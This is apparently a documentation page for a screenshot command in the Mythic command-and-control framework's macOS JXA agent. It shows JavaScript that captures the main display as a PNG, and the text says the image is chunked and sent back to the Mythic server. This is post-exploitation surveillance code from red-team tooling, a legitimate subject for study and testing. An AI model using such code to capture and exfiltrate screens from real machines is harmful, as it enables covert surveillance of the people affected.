## Detailed Summary
This uses API calls to read the current screen the return it to Mythic. This doesn't currently capture _all_ screens though.
```javascript
let cgimage = $.CGDisplayCreateImage($.CGMainDisplayID());
if(cgimage.js === undefined) {
    cgimage = $.CFMakeCollectable(cgimage); // in case 10.15 is messing with the types again
}
if(cgimage.js === undefined){
  return {"user_output":"Failed to get image from display", "completed": true, "status": "error"};
}
let bitmapimagerep = $.NSBitmapImageRep.alloc.initWithCGImage(cgimage);
let capture = bitmapimagerep.representationUsingTypeProperties($.NSBitmapImageFileTypePNG, Ref());
```
The screencapture is chunked and sent back to Mythic.
